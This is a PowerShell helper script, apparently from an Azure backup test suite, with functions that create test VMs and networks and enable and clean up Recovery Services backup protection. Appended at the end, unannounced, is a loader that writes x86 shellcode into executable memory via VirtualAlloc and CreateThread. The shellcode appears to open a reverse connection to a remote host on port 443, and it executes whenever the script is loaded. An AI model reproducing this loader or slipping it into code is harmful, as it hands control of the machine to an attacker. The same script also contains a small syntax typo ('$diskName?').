













function Create-VM(
	[string] $resourceGroupName, 
	[string] $location, 
	[int] $nick = 0)
{
	$suffix = $(Get-RandomSuffix 5) + $nick
	$vmName = "PSTestVM" + $suffix

	$vm = Get-AzVM -ResourceGroupName $resourceGroupName -Name $vmName -ErrorAction Ignore

	if ($vm -eq $null)
	{
		$subnetConfigName = "PSTestSNC" + $suffix
		$subnetConfig = New-AzVirtualNetworkSubnetConfig -Name $subnetConfigName -AddressPrefix 192.168.1.0/24

		$vnetName = "PSTestVNET" + $suffix
		$vnet = New-AzVirtualNetwork -ResourceGroupName $resourceGroupName -Location $location `
			-Name $vnetName -AddressPrefix 192.168.0.0/16 -Subnet $subnetConfig -Force

		$pipName = "pstestpublicdns" + $suffix
		$pip = New-AzPublicIpAddress -ResourceGroupName $resourceGroupName -Location $location `
			-AllocationMethod Static -IdleTimeoutInMinutes 4 -Name $pipName -Force

		$nsgRuleRDPName = "PSTestNSGRuleRDP" + $suffix
		$nsgRuleRDP = New-AzNetworkSecurityRuleConfig -Name $nsgRuleRDPName  -Protocol Tcp `
			-Direction Inbound -Priority 1000 -SourceAddressPrefix * -SourcePortRange * -DestinationAddressPrefix * `
			-DestinationPortRange 3389 -Access Allow

		$nsgRuleWebName = "PSTestNSGRuleWeb" + $suffix
		$nsgRuleWeb = New-AzNetworkSecurityRuleConfig -Name $nsgRuleWebName  -Protocol Tcp `
			-Direction Inbound -Priority 1001 -SourceAddressPrefix * -SourcePortRange * -DestinationAddressPrefix * `
			-DestinationPortRange 80 -Access Allow

		$nsgName = "PSTestNSG" + $suffix
		$nsg = New-AzNetworkSecurityGroup -ResourceGroupName $resourceGroupName -Location $location `
			-Name $nsgName -SecurityRules $nsgRuleRDP,$nsgRuleWeb -Force

		$nicName = "PSTestNIC" + $suffix
		$nic = New-AzNetworkInterface -Name $nicName -ResourceGroupName $resourceGroupName -Location $location `
			-SubnetId $vnet.Subnets[0].Id -PublicIpAddressId $pip.Id -NetworkSecurityGroupId $nsg.Id -Force

		$UserName='demouser'
		$PasswordString = $(Get-RandomSuffix 12)
		$Password=$PasswordString| ConvertTo-SecureString -Force -AsPlainText
		$Credential=New-Object PSCredential($UserName,$Password)

		$vmConfig = New-AzVMConfig -VMName $vmName -VMSize Standard_D1 | `
			Set-AzVMOperatingSystem -Windows -ComputerName $vmName -Credential $Credential | `
			Set-AzVMSourceImage -PublisherName MicrosoftWindowsServer -Offer WindowsServer `
			-Skus 2016-Datacenter -Version latest | Add-AzVMNetworkInterface -Id $nic.Id

		New-AzVM -ResourceGroupName $resourceGroupName -Location $location -VM $vmConfig | Out-Null
		$vm = Get-AzVM -ResourceGroupName $resourceGroupName -Name $vmName
	}

	return $vm
}


function Create-UnmanagedVM(
	[string] $resourceGroupName,
	[string] $location,
	[string] $saname,
	[int] $nick = 0)
{
	$suffix = $(Get-RandomSuffix 5) + $nick
	$vmName = "PSTestVM" + $suffix

	$vm = Get-AzVM -ResourceGroupName $resourceGroupName -Name $vmName -ErrorAction Ignore

	if ($vm -eq $null)
	{
		$subnetConfigName = "PSTestSNC" + $suffix
		$subnetConfig = New-AzVirtualNetworkSubnetConfig -Name $subnetConfigName -AddressPrefix 192.168.1.0/24


		$vnetName = "PSTestVNET" + $suffix
		$vnet = New-AzVirtualNetwork -ResourceGroupName $resourceGroupName -Location $location `
			-Name $vnetName -AddressPrefix 192.168.0.0/16 -Subnet $subnetConfig -Force

		$pipName = "pstestpublicdns" + $suffix
		$pip = New-AzPublicIpAddress -ResourceGroupName $resourceGroupName -Location $location `
			-AllocationMethod Static -IdleTimeoutInMinutes 4 -Name $pipName -Force


		$nsgRuleRDPName = "PSTestNSGRuleRDP" + $suffix
		$nsgRuleRDP = New-AzNetworkSecurityRuleConfig -Name $nsgRuleRDPName  -Protocol Tcp `
			-Direction Inbound -Priority 1000 -SourceAddressPrefix * -SourcePortRange * -DestinationAddressPrefix * `
			-DestinationPortRange 3389 -Access Allow

		$nsgRuleWebName = "PSTestNSGRuleWeb" + $suffix
		$nsgRuleWeb = New-AzNetworkSecurityRuleConfig -Name $nsgRuleWebName  -Protocol Tcp `
			-Direction Inbound -Priority 1001 -SourceAddressPrefix * -SourcePortRange * -DestinationAddressPrefix * `
			-DestinationPortRange 80 -Access Allow

		$nsgName = "PSTestNSG" + $suffix
		$nsg = New-AzNetworkSecurityGroup -ResourceGroupName $resourceGroupName -Location $location `
			-Name $nsgName -SecurityRules $nsgRuleRDP,$nsgRuleWeb -Force


		$nicName = "PSTestNIC" + $suffix
		$nic = New-AzNetworkInterface -Name $nicName -ResourceGroupName $resourceGroupName -Location $location `
			-SubnetId $vnet.Subnets[0].Id -PublicIpAddressId $pip.Id -NetworkSecurityGroupId $nsg.Id -Force

		$UserName='demouser'
		$PasswordString = $(Get-RandomSuffix 12)
		$Password=$PasswordString| ConvertTo-SecureString -Force -AsPlainText
		$Credential=New-Object PSCredential($UserName,$Password)


		$vmsize = "Standard_D1"
		$vm = New-AzVMConfig -VMName $vmName -VMSize $vmSize
		$pubName = "MicrosoftWindowsServer"
		$offerName = "WindowsServer"
		$skuName = "2016-Datacenter"
		$vm = Set-AzVMOperatingSystem -VM $vm -Windows -ComputerName $vmName -Credential $Credential
		$vm = Set-AzVMSourceImage -VM $vm -PublisherName $pubName -Offer $offerName -Skus $skuName -Version "latest" 
		$vm = Add-AzVMNetworkInterface -VM $vm -Id $NIC.Id 


		$sa = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $saname
		$diskName = "mydisk"
		$OSDiskUri = $sa.PrimaryEndpoints.Blob.ToString() + "vhds/" + $diskName? + ".vhd"

		$vm = Set-AzVMOSDisk -VM $vm -Name $diskName -VhdUri $OSDiskUri -CreateOption fromImage

		New-AzVM -ResourceGroupName $resourceGroupName -Location $location -VM $vm | Out-Null
	}

	return $vm
}

function Create-GalleryVM(
	[string] $resourceGroupName, 
	[string] $location, 
	[int] $nick = 0)
{
	$suffix = $(Get-RandomSuffix 5) + $nick
	$vmName = "PSTestGVM" + $suffix

	$vm = Get-AzVM -ResourceGroupName $resourceGroupName -Name $vmName -ErrorAction Ignore

	if ($vm -eq $null)
	{
		$subnetConfigName = "PSTestSNC" + $suffix
		$vnetName = "PSTestVNET" + $suffix
		$pipName = "pstestpublicdns" + $suffix
		$nsgName = "PSTestNSG" + $suffix
		$dnsLabel = "pstestdnslabel" + "-" + $suffix

		$UserName='demouser'
		$PasswordString = $(Get-RandomSuffix 12)
		$Password=$PasswordString| ConvertTo-SecureString -Force -AsPlainText
		$Credential=New-Object PSCredential($UserName,$Password)

		$vm = New-AzVm `
			-ResourceGroupName $resourceGroupName `
			-Name $vmName `
			-Location $location `
			-SubnetName $subnetConfigName `
			-SecurityGroupName $nsgName `
			-PublicIpAddressName $pipName `
			-ImageName "MicrosoftWindowsServer:WindowsServer:2012-R2-Datacenter:latest" `
			-Credential $Credential `
			-DomainNameLabel $dnsLabel
	}

	return $vm
}

 function Cleanup-ResourceGroup(
	[string] $resourceGroupName)
{
	$resourceGroup = Get-AzResourceGroup -Name $resourceGroupName -ErrorAction Ignore
 	if ($resourceGroup -ne $null)
	{
		
		$vaults = Get-AzRecoveryServicesVault -ResourceGroupName $resourceGroupName
		foreach ($vault in $vaults)
		{
			Delete-Vault $vault
		}
	
		
		Remove-AzResourceGroup -Name $resourceGroupName -Force
	}
}

function Delete-Vault($vault)
{
	$containers = Get-AzRecoveryServicesBackupContainer `
		-VaultId $vault.ID `
		-ContainerType AzureVM
	foreach ($container in $containers)
	{
		$items = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType AzureVM
		foreach ($item in $items)
		{
			Disable-AzRecoveryServicesBackupProtection `
				-VaultId $vault.ID `
				-Item $item `
				-RemoveRecoveryPoints -Force
		}
	}

	Remove-AzRecoveryServicesVault -Vault $vault
}


 
function Start-TestSleep($milliseconds)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback)
    {
        Start-Sleep -Milliseconds $milliseconds
    }
}

function Enable-Protection(
	$vault, 
	$vm,
	[string] $resourceGroupName = "")
{
    
    Start-TestSleep 5000
	$container = Get-AzRecoveryServicesBackupContainer `
		-VaultId $vault.ID `
		-ContainerType AzureVM `
		-FriendlyName $vm.Name;

	if($resourceGroupName -eq "")
	{
		$resourceGroupName = $vm.ResourceGroupName
	}

	if ($container -eq $null)
	{
		$policy = Get-AzRecoveryServicesBackupProtectionPolicy `
			-VaultId $vault.ID `
			-Name "DefaultPolicy";
	
		Enable-AzRecoveryServicesBackupProtection `
			-VaultId $vault.ID `
			-Policy $policy `
			-Name $vm.Name `
			-ResourceGroupName $resourceGroupName | Out-Null

		$container = Get-AzRecoveryServicesBackupContainer `
			-VaultId $vault.ID `
			-ContainerType AzureVM `
			-FriendlyName $vm.Name;
	}
	
	$item = Get-AzRecoveryServicesBackupItem `
		-VaultId $vault.ID `
		-Container $container `
		-WorkloadType AzureVM `
		-Name $vm.Name

	return $item
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0xc0,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

